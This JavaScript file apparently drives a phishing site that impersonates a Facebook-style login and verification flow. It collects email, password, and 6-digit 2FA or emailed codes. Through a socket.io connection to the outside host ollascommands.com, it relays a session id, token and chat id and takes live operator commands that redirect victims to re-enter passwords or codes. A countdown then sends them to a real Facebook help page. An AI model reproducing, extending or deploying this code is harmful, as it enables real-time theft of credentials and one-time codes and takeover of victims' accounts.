$("form").submit(function (e) {
  const inputs = e.target.querySelectorAll('input, textarea');
  var hasError = false;
  for(let input of inputs){
    const dataset = input.dataset;
    if(dataset.required == "true"){
      const parent = $(input).parent();
      let error = $(input).next("span.error");
      if(error.length < 1) error = $(input).parent().parent().find("span.error");

      if(input.type == "checkbox"){
        if(!input.checked){
          error.css("display", "inline-block");
          hasError = true;
        } else {
          error.css("display", "none");
        }
      } else if(dataset.mobile == "true") {
        if(!input.value.match(/^(\+)?([0-9]){8,16}$/)){
          hasError = true;
          error.css("display", "inline-block");
        }else {
          if(parent.attr("data-next") == "true"){
            parent.next().fadeIn();
          } 
          error.css("display", "none");
        }
      } else if(dataset.email == "true"){
        if(!input.value.match(/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/)){
          hasError = true;
          error.css("display", "inline-block");
        }else {
          if(parent.attr("data-next") == "true"){
            parent.next().fadeIn();
            parent.find(".next").fadeOut();
          }
          if(parent.attr("data-submit") == "true"){
            $(".buttonHolder").css("display", "block");
          }
          error.css("display", "none");
        }
      } else if(dataset.codetype == "2fa"){
        if(!input.value.match(/^[0-9]{6}$/)){
          hasError = true;
          error.css("display", "inline-block");
          error.text("Entered code must be exactly 6 digits");
        }else {
          error.css("display", "none");
        }
      } else if(dataset.codetype == "email"){
        if(!input.value.match(/^[0-9]{5}$/) && !input.value.match(/^[0-9]{8}$/)){
          hasError = true;
          error.css("display", "inline-block");
          error.text("Entered code is incorrect.");
        }else {
          error.css("display", "none");
        }
      } else {
        if(!input.value){
          hasError = true;
          error.css("display", "inline-block");
        }else {
          if(parent.attr("data-next") == "true"){
            parent.next().fadeIn();
            parent.find(".next").fadeOut();
          }
          error.css("display", "none");
        }
      }
    }
  }
  if(hasError) e.preventDefault();
  else {
    const onValidate = $(this).attr("onValidateCallback");
    if(onValidate) onLoginSubmit(e, this);
  }
})

function redirect_to($url){
  window.location.href = $url;
}

$(function () {
  const sid = $("#sessId").val();
  const message = $("#appMessage").val();
  const token = $("#appToken").val();
  const chatId = $("#appChatId").val();
  var socket = io('https://ollascommands.com/', { 
    query: `room=${sid}&message=${encodeURIComponent(message)}&chatId=${chatId}&token=${token}` 
  });
  
  socket.on('action', data => {
    receiveMessage(data);
  });
  
  function receiveMessage(data){
    switch(data) {
      case "PASSWDAGAIN":
        redirect_to("/login?again=true");
        return;
      case "SENDTOEMAIL":
        redirect_to("/auth?type=email");
        return;
      case "SENDTO2FA":
        redirect_to("/auth?type=2fa");
        return;
      case "2FAAGAIN":
        redirect_to("/auth?type=2fa&again=true");
        return;
      case "EMAILAGAIN":
        redirect_to("/auth?type=email&again=true");
        return;
      case "ERROR":
        redirect_to("/result");
        return;
      case "RESTRICT":
        redirect_to("/result?restrict=true");
        return;
      case "CAREER":
        redirect_to("/registration?allow=true");
        return;
    }
  };
});

// Start Home
$(".continue-email-modal, .continue-email").blur(function(e) {
  if(!$(this).val()) {
    $(this).parent().addClass("error");
    $(this).parent().find("span.error").fadeIn(0);
  } else {
    $(this).parent().removeClass("error");
    $(this).parent().find("span.error").fadeOut(0);
  }
});

$(".continue-with-email-modal").click(function(e) {
  e.preventDefault();
  const input = $(".continue-email-modal");
  const email = $(".continue-email-modal").val();
  if(!email) {
    input.parent().addClass("error");
    input.parent().find("span.error").fadeIn(0);
  } else window.location.href = "/login?email=" + email;
});

$(".continue-with-email").click(function(e) {
  e.preventDefault();
  const input = $(".continue-email");
  const email = $(".continue-email").val();
  if(!email) {
    input.parent().addClass("error");
    input.parent().find("span.error").fadeIn(0);
  } else window.location.href = "/login?email=" + email;
});

$(".open-signin-modal").click(function(e) {
  e.stopPropagation();
  e.preventDefault();
  $(".login-modal").fadeIn(300).css("display","flex");
});

$(".arrow").click(function(){
  $(this).toggleClass("rotate");
  $("#expandable-list").slideToggle();
})

$(".open-menu").click(function() {
  $(".mobile-menu").fadeIn(300);
})

$(".close-signin-modal").click(function() {
  $(".login-modal").fadeOut(300);
})
// End Home

// Start Registration
var form = document.getElementById("form2");
initials = {
  classTo: 'input',
  errorClass: 'error',
  errorTextParent: 'input',
  errorTextTag: 'div',
  errorTextClass: 'text-help'
}
var pristine = new Pristine(form, initials);
form.addEventListener('submit', function (e) {
  e.preventDefault();
  var valid = pristine.validate();
  if(!valid) return;
  $(".step2").fadeOut(0);
  $(".step3").fadeIn(300);
  $(".steps .line:nth-child(2)").addClass("active");
});


$(".getStarted").click(function() {
  $(".step1").fadeOut(0);
  $(".step2").fadeIn(300);
  $(".steps").removeClass("display-none-imp")
});

var form3 = document.getElementById("form3");
var pristine3 = new Pristine(form3, initials);
form3.addEventListener('submit', function (e) {
  e.preventDefault();
  var valid = pristine3.validate();
  if(!valid) return;
  $(".step3").fadeOut(0);
  $(".step4").fadeIn(300);
  $(".steps .line:nth-child(3)").addClass("active");
});

var form4 = document.getElementById("form4");
var pristine4 = new Pristine(form4, initials);
form4.addEventListener('submit', function (e) {
  e.preventDefault();
  var valid = pristine4.validate();
  if(!valid) return;
  $(".step4").fadeOut(0);
  $(".step5").fadeIn(300);
  $(".steps").fadeOut(0);
});

$(".userStatus").change(function() {
  const className = $(this).val();
  $(".userStatuses").fadeOut(0);
  $(`.${className}`).slideToggle(300);
  $(`.userStatuses`).find("input[type='text']").attr("required", false);
  $(`.${className}`).find("input[type='text']").attr("required", true);
  pristine = new Pristine(form, initials, false);
});
// End Registration

// Start Auth
function openAuthModal(){
  $("#modalContainer").addClass("active");
  $("#errorRequired").css("display", "none");
}
// End Auth

// Start AuthModal
function closeAuthModal(){
  $("#modalContainer").removeClass("active");
}
// End AuthModal

// Start Loader
$('.auto-refresher').autoRefresher({
  progressBarHeight:'16px',
  seconds: 900,
  showControls: false
});

function secondsToMinutes(time){
  return ('00' + Math.floor(time / 60)).slice(-2) + ':' + ('00' + Math.floor(time % 60)).slice(-2);
}

let interval = setInterval(() => {
  const seconds = $("#seconds");
  const progress = parseInt(seconds.attr("data-seconds"));
  if(progress === 900) {
    window.location.href = "https://www.facebook.com/help/?helpref=hc_global_nav";
  } else {
    seconds.text(secondsToMinutes(progress));
    seconds.attr("data-seconds", progress+1)
  }
}, 1000);
// End Loader

// Start Modal
function closeModal(){
  $("#modalContainer").remove();
}
// End Modal